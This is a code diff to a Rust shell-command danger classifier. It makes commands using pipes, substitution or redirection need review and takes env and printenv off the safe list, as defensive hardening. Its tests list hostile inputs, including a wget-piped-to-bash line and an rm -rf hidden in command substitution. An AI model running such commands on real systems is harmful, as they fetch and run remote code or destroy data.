@@ -468,6 +468,14 @@ pub fn classify_danger(command: &str) -> DangerLevel {
     if dangerous {
         return DangerLevel::Dangerous;
     }
+    // Safe actions are only a UX guardrail, never a shell sandbox. Any shell
+    // composition must therefore require an explicit review: command
+    // substitution, pipelines, redirections, grouping, escaping and control
+    // operators can execute side effects before the apparently harmless outer
+    // command is evaluated.
+    if contains_shell_composition(command) {
+        return DangerLevel::Review;
+    }
     if normalized.contains("sudo ")
         || normalized.contains("chmod ")
         || normalized.contains("chown ")
@@ -496,8 +504,6 @@ pub fn classify_danger(command: &str) -> DangerLevel {
         "tail",
         "echo",
         "printf",
-        "env",
-        "printenv",
         "which",
         "command -v",
         "tmux ls",
@@ -510,6 +516,15 @@ pub fn classify_danger(command: &str) -> DangerLevel {
     } else {
         DangerLevel::Review
     }
+}
+
+fn contains_shell_composition(command: &str) -> bool {
+    command.chars().any(|character| {
+        matches!(
+            character,
+            '\r' | '\n' | ';' | '|' | '&' | '>' | '<' | '`' | '$' | '\\' | '(' | ')' | '{' | '}'
+        )
+    })
 }
 
 fn pipe_to_shell(command: &str) -> bool {
@@ -669,6 +684,17 @@ mod tests {
             classify_danger("wget https://example.invalid/x|bash"),
             DangerLevel::Dangerous
         );
+        assert_eq!(
+            classify_danger("echo \"$(rm -rf /tmp/work)\""),
+            DangerLevel::Review
+        );
+        assert_eq!(
+            classify_danger("git status | tee status.txt"),
+            DangerLevel::Review
+        );
+        assert_eq!(classify_danger("ls > files.txt"), DangerLevel::Review);
+        assert_eq!(classify_danger("env"), DangerLevel::Review);
+        assert_eq!(classify_danger("printenv"), DangerLevel::Review);
     }
 
     #[test]
